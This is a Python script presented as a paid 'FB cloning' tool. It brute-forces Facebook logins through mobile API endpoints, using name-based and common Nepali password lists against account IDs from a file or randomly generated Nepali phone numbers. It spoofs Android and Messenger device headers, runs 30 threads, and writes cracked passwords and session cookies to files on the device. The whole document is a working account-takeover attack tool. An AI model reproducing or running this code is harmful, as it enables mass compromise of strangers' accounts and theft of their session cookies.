
import os,requests,json,time,re,random,sys,uuid,string,subprocess
from string import ascii_lowercase, ascii_uppercase, digits
import shutil
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as sop

try:
    import requests
    import bs4
    import json
    import re
    import random
    import string
    import subprocess
    import uuid
    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as sop
    from datetime import datetime
except ModuleNotFoundError: 
    print('\n Installing missing modules ...')
    os.system('pip install requests bs4 futures==2 > /dev/null')
    os.system('python FB.py')
############################
print('\x1b[1;92mFACEBOOK CLONING TOOL ')
time.sleep(2)
############################
def get_prop(prop, default="Unknown"):
    try:
        return subprocess.check_output(f'getprop {prop}', shell=True).decode('utf-8').strip() or default
    except:
        return default

android_version = get_prop('ro.build.version.release')
model = get_prop('ro.product.model')
build = get_prop('ro.build.id')
fbmf = get_prop('ro.product.manufacturer')
fbbd = get_prop('ro.product.brand')
fbca = get_prop('ro.product.cpu.abilist').replace(',', ':')
fbdm = f"{{density=2.0, height={get_prop('ro.hwui.text_large_cache_height', '1920')}, width={get_prop('ro.hwui.text_large_cache_width', '1080')}}}"
fbcr = get_prop('gsm.operator.alpha', 'NTC')  # Default to NTC

# WiFi Details
wifi_ssid = get_prop('wifi.ssid', 'Unknown')  # WiFi Name
wifi_bssid = get_prop('wifi.interface', '00:00:00:00:00:00')  # WiFi MAC Address

# Carrier (NTC/NCELL) Check
sim_ids = fbcr.split(',')
sim_id = sim_ids[0] if sim_ids else 'NTC'  # Default fallback to NTC

# Device dictionary
device = {
    'android_version': android_version,
    'model': model,
    'build': build,
    'fblc': 'ne_NP',
    'fbmf': fbmf,
    'fbbd': fbbd,
    'fbdv': model,
    'fbsv': android_version,
    'fbca': fbca,
    'fbdm': fbdm,
    'fbcr': sim_id,  # Carrier (NTC/NCELL)
    'wifi_ssid': wifi_ssid,  # WiFi Name
    'wifi_bssid': wifi_bssid  # WiFi MAC Address
}

# Final User-Agent
user_agent = (
    f"Dalvik/2.1.0 (Linux; U; Android {android_version}; {model} Build/{build}) "
    f"[FBAN/Messenger;FBAV/{android_version}.0.0.0.{build};FBBV/{build};"
    f"FBDM/{fbdm};FBLC/ne_NP;FBSV/{android_version};FBSS/2;FBID/phone;"
    f"FBPN/com.facebook.orca;Carrier/{sim_id};WiFiSSID/{wifi_ssid};WiFiBSSID/{wifi_bssid}]"
)

# ✅ Check everything at the end
####print("\n[Device Info]")
###for key, value in device.items():
    ###print(f"{key}: {value}")

###print("\n[Generated User-Agent]")
####print(user_agent)

#+++++++++++++++++++++++++++++++++#
######YEAR CHECKER######
def zari(ids):
    if len(ids)==15:
        if ids[:10] in ['1000000000']       :alif = '2009'
        elif ids[:9] in ['100000000']       :alif = '2009'
        elif ids[:8] in ['10000000']        :alif = '2009'
        elif ids[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:alif = '2009'
        elif ids[:7] in ['1000006','1000007','1000008','1000009']:alif = '2010'
        elif ids[:6] in ['100001']          :alif = '2010-2011'
        elif ids[:6] in ['100002','100003'] :alif = '2011-2012'
        elif ids[:6] in ['100004']          :alif = '2012-2013'
        elif ids[:6] in ['100005','100006'] :alif = '2013-2014'
        elif ids[:6] in ['100007','100008'] :alif = '2014-2015'
        elif ids[:6] in ['100009']          :alif = '2015'
        elif ids[:5] in ['10001']           :alif = '2015-2016'
        elif ids[:5] in ['10002']           :alif = '2016-2017'
        elif ids[:5] in ['10003']           :alif = '2018-2019'
        elif ids[:5] in ['10004']           :alif = '2019-2020'
        elif ids[:5] in ['10005']           :alif = '2020'
        elif ids[:5] in ['10006','10007','']:alif = '2021'
        elif ids[:5] in ['10008']           :alif = '2022'
        elif ids[:5] in ['10009']           :alif = '2023'
        else:alif=''
    elif len(ids) in [9,10]:
        alif = '2008-2009'
    elif len(ids)==8:
        alif = '2007-2008'
    elif len(ids)==7:
        alif = '2006-2007 '
    elif len(ids) in [13,14]:
        alif = '2023-2024'
    else:alif=''
    return alif
#++++++++++++++COLORS+++++++++++++#
pwx=[]
W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
S = '\033[96;1m'
N = '\x1b[0m'
PURPLE ='\x1b[38;5;46m'
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
BLACK="\033[1;30m"
EXTRA ='\x1b[38;5;208m'
#++++++++++++LOGO+++++++++++++#

logo=(f"""
\x1b[38;5;46m888     888 888b    888  .d88888b.  
888     888 8888b   888 d88P" "Y88b 
888     888 88888b  888 888     888 
888     888 888Y88b 888 888     888 
888     888 888 Y88b888 888     888 
888     888 888  Y88888 888     888 
Y88b. .d88P 888   Y8888 Y88b. .d88P 
 "Y88888P"  888    Y888  "Y88888P"  
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[0;41m           [ ENJOY FB CLONING ]           \033[0;92m   ║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\33[1;32m==================================================
\033[1;92m[\033[1;96m[>]\033[1;92m]\033[1;92m AUTHOR  \033[1;91m : \033[1;96mUNO/NICO
\033[1;92m[\033[1;96m[>]\033[1;92m]\033[1;92m FACEBOOK\033[1;91m : \033[1;96mUNO/NICO
\033[1;92m[\033[1;96m[>]\033[1;92m]\033[1;92m TYPE  \033[1;91m : \033[1;96mPRIVATE/PAID
\033[1;92m[\033[1;96m[>]\033[1;92m]\033[1;92m TOOLS   \033[1;91m : \033[1;96mFB RANDOM CLONE 
\033[1;92m[\033[1;96m[>]\033[1;92m]\033[1;92m VERSION \033[1;91m : \033[1;96m0.0
\033[1;32m==================================================
    """)
#++++++++++LINEX++++++++#
def linex():
    print('\033[1;37m==================================================')
#++++++++++LOOP+++++++++#
loop=0
oks=[]
cps=[]
twf=[]
pcp=[]
id=[]
tokenku=[]
user_agents=[]
#++++++++++MAIN+++++++++#
def YUJI():   
    os.system('clear')
    print(logo)
    try:
                y = ("***")
                if y == ("***"):
                        print('[1] FILE CLONING ')
                        print('[2] RANDOM CLONING (SIM CODE) ')
                        print('[0] EXIT ')
                        linex()
                        opt=input('CHOOSE : ')
                        if opt in ['1','01']:
                                os.system('clear')
                                print(logo)
                                print('PUT FILE EXAMPLE :  /sdcard/YUJI.txt')
                                linex()
                                file = input('PUT FILE PATH\033[1;37m: ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print('FILE NOT FOUND ')
                                        time.sleep(1)
                                        main_approval()
                                os.system('clear')
                                print(logo)
                                print('[1] METHOD (GRAPH) ')
                                linex()
                                mthd=input('CHOOSE : ')
                                linex()
                                os.system('clear')
                                print(logo)
                                plist = []
                                print('[+] CHOOSE PASSLIST METHOD ')
                                linex()
                                print('[1] AUTO PASSWORD (30 PASSLIST) ')
                                print('[2] AUTO PASSWORD (20 PASSLIST) ')
                                print('[3] AUTO PASSWORD (15 PASSLIST) ')
                                print('[4] AUTO PASSWORD (6 PASSLIST) ')
                                print('[5] MANUAL PASSWORD ')
                                linex()
                                pswrd=input('CHOOSE: ')
                                if pswrd in ['1','01']:
                                        plist = ['iloveyou','iloveyou143','i love you','firstlast','lastfirst','first','last','firstfirst','lastlast','first123','first143','first1234','first12345','last123','last1234','last12345','first last','last first','firstlast123','firstlast12345','first15','first16','first17','first18','first19','first20','last143','firstganda','firstpogi','cuteko','first2021','first2022','first2023', '123456', '111111', '143143', '031008']
                                elif pswrd in ['2','02']:
                                	    plist = ['first','last','first123','first143','last123','last143','last12345','first12345','firstlast','first last','lastfirst','last first','firstlast123','first15','first16','first17','first18','first19','firstpogi','firstmaganda']
                                elif pswrd in ['3','03']:
                                	    plist = ['first123','first143','first','last123','last','last143','firstlast','first last','firstlast123','first15','first16','first17','first18','first19','first12345']
                                elif pswrd in ['4','04']:
                                	    plist = ['first123','first143','firstlast','first last','first12345','first18']
                                else:
                                        try:
                                                linex()
                                                ps_limit = int(input('HOW MANY PASSWORDS DO YOU WANT TO ADD? '))
                                        except:
                                                ps_limit =1
                                        linex()
                                        print('\033[1;32m EXAMPLE : first last, firtslast, first123')
                                        linex()
                                        for i in range(ps_limit):
                                                plist.append(input(f' PUT PASSWORD {i+1}: '))
                                linex()
                                os.system('clear')
                                print(logo)
                                print('SHOW CP RESULT? : (Y/N): ')
                                linex()
                                cx=input('CHOOSE : ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        os.system('clear')
                                        print(logo)
                                        total_ids = str(len(fo))
                                        
                                        print('TOTAL ACCOUNT : \033[1;32m('+total_ids+f')\033[1;37m')
                                        print('TAKE NOTE: ON AIRPLANE MODE IF NO RESULT\033[1;37m')
                                        print('METHOD : '+mthd+' ')
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(meth1,ids,names,passlist)
                                print('\033[1;37m')
                                linex()
                                print('THE PROCESS HAS COMPLETED')
                                print('Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                linex()
                                input('PRESS ENTER TO BACK ')
                                YUJI()
                        elif opt in ['2','02']:
                        	ph()
                        elif opt in ['0','00']:
                        	print(f'{R}GOOD BYE')
                        else:
                        	print(f'{R}INVALID')
                        	
    except requests.exceptions.ConnectionError:
                print('\n NO INTERNET CONNECTION ...')
                exit()
######
import os
import random
import string
from concurrent.futures import ThreadPoolExecutor as tred
import os
import random
from concurrent.futures import ThreadPoolExecutor as tred

# सही नेपाली नम्बर सुरू हुने Prefix हरू (NTC, Ncell, Smart)
valid_prefixes = [
    '984', '985', '986',        # NTC (GSM)
    '974', '975', '976',        # NTC (CDMA)
    '980', '981', '982',        # Ncell (GSM)
    '961', '962',               # Ncell (VoLTE)
    '963'                       # Smart Cell (GSM)
]

def generate_valid_number():
    prefix = random.choice(valid_prefixes)  # वैध prefix छान्ने
    suffix = ''.join(random.choices("0123456789", k=7))  # 7-digit नम्बर बनाउने
    return "+977" + prefix + suffix  # अन्तिम नम्बर बनाउने

def ph():
    user = []
    os.system('clear')
    print(logo)
    print('\033[1;32mSIM CODE: +977 (Fixed for Nepal)')  # नेपालका लागि fixed
    linex()

    try:
        limit = int(input('\033[1;32mPUT LIMIT: '))
        if limit <= 0:
            raise ValueError
    except ValueError:
        limit = 100000  

    # वैध नेपाली नम्बर बनाउने
    user = [generate_valid_number() for _ in range(limit)]

    with tred(max_workers=30) as ZARI:     
        os.system('clear')
        print(logo)
        print(f'\033[1;32mLIMIT: {len(user)}')
        linex()

        # Strong & Realistic Passwords
        passlist = [
             'password123', 'loveu143', 'nepali143', 'hamro@123', 'sunshine@01',
             'nepal123', 'nepal12345', 'nepal@123', 'magar', 'magar123', 'maya',
             'maya123', 'pokhara', 'kumari', 'kathmandu', 'kathmandu123', 'tamang123',
             'tamang', 'rai123', 'Magar123', 'nepalsun', 'everest2025', 'pokhara@123',
             'kathmandu01', 'mountain123', 'hamro123', 'nepal@pass', 'namaste123',
             'sunnyday123', 'raistar', 'shiv@123'
              ]

        for ids in user:
            psx = ids[-7:]  # नम्बरको अन्तिम 7 अंक पासवर्ड बनाउन
            ZARI.submit(rndm, ids, [psx, ids] + passlist)  

    print('\033[1;37m')
    linex()
    print('THE PROCESS HAS COMPLETED')
    print(f'TOTAL OK/CP: {len(oks)}/{len(cps)}')  
    linex()
    input('PRESS ENTER TO BACK ')
    main()

#++++++
import random

def warlee():
    and_ver = random.randint(9, 12)
    app_ver = f"{random.randint(111, 999)}.0.0.{random.randint(9, 99)}.{random.randint(111, 333)}"
    app_ver_code = random.randint(111111111, 999999999)
    
    # Update with popular Nepal devices
    model = random.choice([
        "Samsung Galaxy A31", "Redmi Note 10", "Oppo A5 2020", 
        "Vivo V20", "Realme Narzo 30 Pro", "Infinix Hot 10", 
        "Huawei Nova 7i", "Nokia 5.3", "Micromax IN 1"
    ])
    
    # Change SIM options to reflect Nepal's major carriers
    sim = random.choice(["Nepal Telecom", "Ncell", "Smart Cell"])
    
    # Other parameters for screen density, size etc.
    density = random.choice(["1.5", "2.0", "3.0"])
    width = random.choice(["540", "720", "1080"])
    height = random.randint(999, 2480)

    return f"Dalvik/2.1.0 (Linux; U; Android {and_ver}; {model} Build/QP1A.{app_ver_code}) [FBAN/Messenger;FBAV/{app_ver};FBBV/{app_ver_code};FBDM/{{density={density}, width={width}, height={height}}};FBLC/en_NP;FBSV/{and_ver};FBSS/2;FBID/phone;FBPN/com.facebook.orca]"

# Example call to the function
#print(warlee())
#++++++
import random
import string
import uuid
import sys
import requests

def meth1(ids, names, passlist):
    try:
        global ok, loop, sim_id
        sys.stdout.write(f'\r\r\033[1;37m[NICO-CRACKING] {loop} | \033[1;32mOK: {len(oks)} \033[1;37m')
        sys.stdout.flush()
        
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            ua = warlee()
            random_seed = random.Random()
            adid = ''.join(random_seed.choices(string.hexdigits, k=16))
            device_id = str(uuid.uuid4())
            secure = str(uuid.uuid4())
            family = str(uuid.uuid4())
            accessToken = '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32'
            xd = ''.join(random_seed.choices(string.digits, k=20))
            sim_serials = f'["{xd}"]'
            li = ['28','29','210']
            li2 = random.choice(li)
            j1 = ''.join(random.choice(string.digits) for _ in range(2))
            jazoest = li2 + j1
            
            data = {
                'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas,
                'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 
                'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 
                'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 
                'fb_api_req_friendly_name': 'authenticate'
            }
            headers = {
                'Authorization': f'OAuth {accessToken}', 'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Connection-Type': 'unknown', 'User-Agent': ua, 'Accept-Encoding': 'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'
            }
            
            url = 'https://api.facebook.com/method/auth.login'
            twf = 'Login approval' + 's are on. ' + 'Expect an SMS' + ' shortly with ' + 'a code to use' + ' for log in'
            YUJI = requests.post(url, data=data, headers=headers).json()
            
            if 'session_key' in YUJI:
                coki = ";".join(i["name"] + "=" + i["value"] for i in YUJI["session_cookies"])
                print(f'\r\r\033[1;32m[NICO-OK] {ids}|{pas}|{zari(ids)} \033[1;97m')
                open('/sdcard/NICO-OK.txt', 'a').write(f'{ids}|{pas}\n')
                
                # Handle different sim number ranges and save to appropriate files
                if ids[:4] in ['1000']:  # Example: NTC
                    open('/sdcard/NICO-OLD-COOKIE.txt', 'a').write(f'{ids}|{pas}|{coki}\n')
                elif ids[:4] in ['6155', '6156']:  # Example: Ncell
                    open('/sdcard/NICO-NEW-COOKIE.txt', 'a').write(f'{ids}|{pas}|{coki}\n')
                
                oks.append(ids)
                break
            elif twf in str(YUJI):
                if 'y' in pcp:
                    print(f'\r\r\033[1;34m[NICO-2F] {ids} | {pas}')
                    twf.append(ids)
                    break
            elif 'www.facebook.com' in YUJI['error_msg']:
                if 'y' in pcp:
                    print(f'\r\r\x1b[38;5;208m[NICO-CP] {ids} | {pas}\033[1;97m')
                    open('/sdcard/NICO-CP.txt', 'a').write(f'{ids}|{pas}\n')
                    cps.append(ids)
                    break
                else:
                    open('/sdcard/NICO-CP.txt', 'a').write(f'{ids}|{pas}\n')
                    cps.append(ids)
                    break
            else:
                continue
        loop += 1
    except Exception as e:
        pass
##########
import random
import uuid
import time
import sys
import requests

def rndm(ids, passlist):
    global loop
    global oks
    sys.stdout.write(f'\r\r\033[1;37m[NICO-CRACKING] {loop} | \033[1;32mOK: {len(oks)} \033[1;37m')
    sys.stdout.flush()
    
    try:
        for pas in passlist:
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            fbbv = str(random.randint(111111111,999999999))
            
            # Device info for the request
            android_version = device['android_version']
            model = device['model']
            build = device['build']
            fblc = device['fblc']
            fbcr = sim_id
            fbmf = device['fbmf']
            fbbd = device['fbbd']
            fbdv = device['fbdv']
            fbsv = device['fbsv']
            fbca = device['fbca']
            fbdm = device['fbdm']
            fbfw = '1'
            fbrv = '0'
            fban = 'FB4A'
            fbpn = 'com.facebook.katana'

            # Customize locale and country for Nepal
            data = {
                'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas,
                'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 
                'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 
                'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 
                'generate_machine_id': '1', 'currently_logged_in_userid': '0', 
                'locale': 'en_PH',  # Nepalese locale
                'client_country_code': 'PH',  # Nepal country code
                'fb_api_req_friendly_name': 'authenticate', 'api_key': accees_token, 'access_token': accees_token
            }

            headers = {
                'User-Agent': warlee(), 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 
                'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 
                'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 
                'Authorization': f'OAuth {accees_token}', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 
                'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 
                'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': accees_token
            }

            url = 'https://b-graph.facebook.com/auth/login'
            twf = 'Login approval' + 's are on. ' + 'Expect an SMS' + ' shortly with ' + 'a code to use' + ' for log in'
            po = requests.post(url, data=data, headers=headers).json()

            if 'session_key' in po:
                try:
                    uid = po['uid']
                except:
                    uid = ids
                
                if str(uid) in oks:
                    break
                else:
                    print(f'\r\r\033[1;32m[NICO-OK] {str(uid)} | {pas}\033[1;97m')
                    coki = ";".join(i["name"] + "=" + i["value"] for i in po["session_cookies"])
                    open('/sdcard/NICO-COOKIE.txt', 'a').write(f'{str(uid)}|{pas}|{coki}\n')
                    open('/sdcard/NICO-OK.txt', 'a').write(f'{str(uid)}|{pas}\n')
                    oks.append(str(uid))
                    break

            elif 'www.facebook.com' in po['error']['message']:
                try:
                    uid = po['error']['error_data']['uid']
                except:
                    uid = ids
                
                if uid in oks:
                    pass
                else:
                    print(f'\r\r\x1b[1;31m[NICO-CP] {str(uid)} | {pas}\033[1;97m')
                    open('/sdcard/NICO-CP.txt', 'a').write(f'{str(uid)}|{pas}\n')
                    cps.append(str(ids))
                    break
            else:
                continue
        
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
        
YUJI()

